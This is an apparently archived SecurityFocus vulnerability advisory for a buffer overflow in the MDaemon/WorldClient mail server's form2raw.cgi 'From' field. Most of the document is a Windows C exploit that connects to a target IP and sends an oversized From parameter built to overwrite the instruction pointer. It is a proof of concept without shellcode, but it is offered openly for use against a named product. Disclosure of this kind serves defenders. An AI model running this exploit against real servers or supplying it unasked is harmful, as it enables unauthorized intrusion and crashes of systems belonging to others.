source: http://www.securityfocus.com/bid/9317/info

It has been reported that MDaemon/WorldClient mail server may be prone to a buffer overflow vulnerability when handling certain messages with a 'From' field of over 249 bytes. This issue may allow a remote attacker to gain unauthorized access to a system.

Successful exploitation of this issue may allow an attacker to execute arbitrary code in the context of the vulnerable software in order to gain unauthorized access.

#include <windows.h>
#include <stdio.h>
#include <winsock.h>
#pragma comment (lib,"ws2_32")
#define RET 0x1dff160
#define PORT 3000
void main(int argc, char **argv)
{
     SOCKET s = 0;
     WSADATA wsaData;

    if(argc < 2)
     {
          fprintf(stderr, "MDaemon form2raw.cgi Exploit Written by Behrang Fouladi, " \
"\nUsage: %s <target ip> \n", argv[0]);

                  printf("%d",argc);
                       exit(0);
    }

     WSAStartup(MAKEWORD(2,0), &wsaData);

     s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

     if(INVALID_SOCKET != s)
     {
          SOCKADDR_IN anAddr;
          anAddr.sin_family = AF_INET;
          anAddr.sin_port = htons(PORT);
          anAddr.sin_addr.S_un.S_addr = inet_addr(argv[1]);

          if(0 == connect(s, (struct sockaddr *)&anAddr, sizeof(struct sockaddr)))
          {
               static char buffer[500];
                           int i;
                           memset(buffer,0,sizeof(buffer));
                           strcpy(buffer,"get /form2raw.cgi?From=");
                           for(i=0;i<244;i++) {

                                   strcat(buffer,"a");
                           }

                           strcat(buffer,"bbbb"); //Overwrites EIP
                           strcat(buffer,"c");  //One byte left after ESP :-(
                           strcat(buffer,"&To=me@hell.org&Subject=hi&Body=hello HTTP/1.0\r\n\r\n");

                           send(s, buffer, strlen(buffer), 0);
                           printf("Exploit Sent.");

          }

                  else printf("Error Connecting to The Target.\n");
          closesocket(s);
     }

        WSACleanup();
}

